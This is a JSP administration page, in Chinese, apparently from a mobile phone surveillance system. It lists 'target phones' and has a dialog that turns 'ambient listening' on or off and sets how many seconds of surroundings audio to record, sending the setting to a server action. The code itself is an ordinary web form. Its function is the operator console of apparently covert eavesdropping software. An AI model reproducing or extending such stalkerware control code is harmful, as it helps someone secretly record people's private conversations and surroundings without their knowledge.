<%@ page language="java" pageEncoding="utf-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%@ taglib uri="/WEB-INF/tld/SuperTag.tld" prefix="ui"%>
<%@ taglib uri="/WEB-INF/tld/sf.tld" prefix="sf"%>
<%
	String path = request.getContextPath();
	String basePath = request.getScheme() + "://"
			+ request.getServerName() + ":" + request.getServerPort()
			+ path;
%>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
		<title>手机监听管理系统</title>
		<link charset="utf-8" rel="stylesheet" href="<%=basePath%>/resource/css/webbase.css" />
		<link charset="utf-8" rel="stylesheet" href="<%=basePath%>/resource/css/main-layout.css" />
		<link charset="utf-8" rel="stylesheet" href="<%=basePath%>/resource/css/base-ui.css" />
		<link charset="utf-8" rel="stylesheet" href="<%=basePath%>/resource/css/table.css" />
		<link charset="utf-8" rel="stylesheet" 	href="<%=basePath%>/resource/bootstrap/css/bootstrap.min.css" />
		<link charset="utf-8" rel="stylesheet" href="<%=basePath%>/resource/css/dialog.css" />
		<script type="text/javascript" 	src="<%=basePath%>/resource/js/jquery-1.8.3.min.js"></script>
		<script type="text/javascript" src="<%=basePath%>/resource/bootstrap/js/bootstrap.min.js"></script>
		<script type="text/javascript" src="<%=basePath%>/resource/js/framework.js"></script>
		<script>
		
		
		
		  function doSetting()
		  {
		        var account = $('#targetAccount').val();
			    var milieu = $('#milieu').val();
			    var duration = $('#duration').val();
			    if($.trim(duration)=='')
			    {
			       showETip("请填监听录音时长!");
			       return;
			    }
			    
		      if(milieu=='0')
		      {
		         showProcess('正在关闭，请稍后......');
		      }
		      if(milieu=='1')
		      {
		      showProcess('正在开启，请稍后......');
		      }
		      
		      $.post("<%=basePath%>/admin/user_modify.action", {account:account,milieu:milieu,duration:duration},
					function(data){
					
					  if(milieu=='0')
				      {
				         showSTip("关闭成功");
				      }
				      if(milieu=='1')
				      {
				        showSTip("开启成功");
				      }
					document.getElementById('searchForm').submit();
			  });
		  }
		  
		  function toSetting(obj)
		  {
		     $('#targetMobile').text(obj.mobile);
		     $('#targetAccount').val(obj.account);
		     $('#milieu').val(obj.milieu);
		     $('#duration').val(obj.duration);
		     doShowDialog('SettingDialog');
		  }
		</script>
	</head>
	<body class="web-app ui-selectable">


		<%@include file="../header.jsp"%>

		<%@include file="../nav.jsp"%>

		<div id="mainWrapper">
			<div class="panel panel-default">
				<div class="panel-heading">
					环境监听管理
				</div>
				<div class="panel-body" style="padding: 5px;">
					<form action="<%=basePath%>/admin/user_milieuManage.action" method="post"
						id="searchForm" style="padding: 0px;">
						<input type="hidden" name="currentPage" id="currentPage" />
						<table style="width: 100%" class="utable">

							<thead>
								<tr class="tableHeader">
								    <th width="30%">目标手机</th>
									<th width="30%">监听状态</th>
									<th width="30%">监听时长</th>
									<th width="10%">操作</th>
								</tr>
								 
							</thead>
							<tbody id="checkPlanList">

								<c:forEach var="user" items="${page.dataList}">
								   <c:if test="${user.account ne 'admin'}">
									<tr id="${user.account}">
										<td>
											${user.mobile }
										</td>
										<td>
										   <c:if test="${user.milieu eq null || user.milieu eq '0'}">
										      <span class="label label-danger">已关闭</span>
										   </c:if>
										   
										   <c:if test="${user.milieu eq  '1'}">
										     <span class="label label-success">已开启</span>
										   </c:if>
											
										</td>
										<td>
											${user.duration }秒
										</td> 
										<td>
											<button type="button" class="btn btn-success" style="padding: 5px;" onclick="toSetting(${user})">设置</button>
										</td>
									</tr>
								</c:if>
								</c:forEach>
								 

							</tbody>
							<tfoot>
								 
							</tfoot>
						</table>
					</form>

				</div>
			</div>
		 
		 
		 	<div class="panel panel-primary gdialog" id="SettingDialog"
						style="display: none; width: 300px; position: absolute;">
						<div class="panel-heading">
							环境监听设置
							<a class="close" onclick="doHideDialog('SettingDialog')">&times;</a>
						</div>
						<div class="panel-body">
							<form role="form">
								<div class="form-group">
									<label for="Aaccount">
										&nbsp;&nbsp;目标号码:
									</label>
									<label  id="targetMobile"  style="color:red;">
									</label>
									<input type="hidden"   id="targetAccount"  />
								</div>
								<div class="form-group"  style="margin-top: 30px;">
									<label for="Aname">
										<font color="red">*</font>监听开关:
									</label>
									<select  id="milieu"  class="form-control" style="display: inline; width: 150px;">
									  <option value="1">开启</option>
									  <option value="0">关闭</option>
									</select>
								</div>
								<div class="form-group"  style="margin-top: 30px;">
									<label for="Amobile">
										 <font color="red">*</font>监听时长:
									</label>
									<input type="text" class="form-control" id="duration"
									oninput="if(this.value.length==1){this.value=this.value.replace(/[^1-9]/g,'')}else{this.value=this.value.replace(/\D/g,'')}"
										maxlength="3" style="display: inline; width: 150px;" />秒
								</div>
								 
								<div class="form-group"  style="margin-top: 30px;">
									<center>
										<button type="button" class="btn btn-success btn-lg" style=" width: 120px;"
											onclick="doSetting()">
											 保&nbsp;&nbsp;&nbsp;&nbsp;存 
										</button>
									</center>
								</div>
							</form>
						</div>
			</div>
					
					
					
		<script>
		       $('#milieuManageMenu').addClass('current');
		     
		</script>
	</body>
</html>
